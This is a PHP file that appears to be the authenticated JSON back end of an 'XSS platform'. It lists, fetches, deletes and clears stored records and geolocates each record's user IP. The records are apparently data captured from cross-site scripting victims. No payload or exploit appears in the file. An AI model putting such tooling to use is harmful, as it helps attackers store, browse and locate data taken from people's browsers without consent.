<?php
define("IN_XSS_PLATFORM",true);
require('auth.php');
require_once("functions.php");
require_once("config.php");
require_once("dio.php");
header('Content-Type: application/json');
if(isset($_GET['cmd']))
{
	switch($_GET['cmd'])
	{
		case 'list':
			echo json_encode(dirList());
			break;
			
		case 'simplelist':
			
			echo json_encode(dirSimpleList());
			break;
			
		case 'get':
			if(isset($_GET['id'])&&preg_match('/^[0-9]{10}$/',$_GET['id']))
				echo json_encode(loadInfo($_GET['id']));	
			else
				echo json_encode(false);
			break;
			
		case 'del':
			if(isset($_GET['id'])&&preg_match('/^[0-9]{10}$/',$_GET['id']))
				echo json_encode(delInfo($_GET['id']));	
			else
				echo json_encode(false);
			break;
		
		case 'clear':
			echo json_encode(clearInfo());	
			break;
	}
}
function dirSimpleList() { 
	$files = glob(DATA_PATH . '/*.php'); 
	foreach ($files as &$file){
		$file=basename($file,".php");
	}
	return $files;
}
function dirList() { 

	$list=array();
	$files = glob(DATA_PATH . '/*.php'); 
	arsort($files);
	foreach ($files as $file) { 
		$listinfo=array();
		$filename=basename($file,".php");
		$info=loadInfo($filename);
		$isChange=false;
			
		if(!isset($info['location']))
		{
			$info['location']=convertip($info['user_IP'],IPDATA_PATH);
			$isChange=true;
		}
		
		if($isChange)
			saveInfo(json_encode($info),$filename);
		
		$list[]= $info;
	} 
		
	return $list; 
} 
?>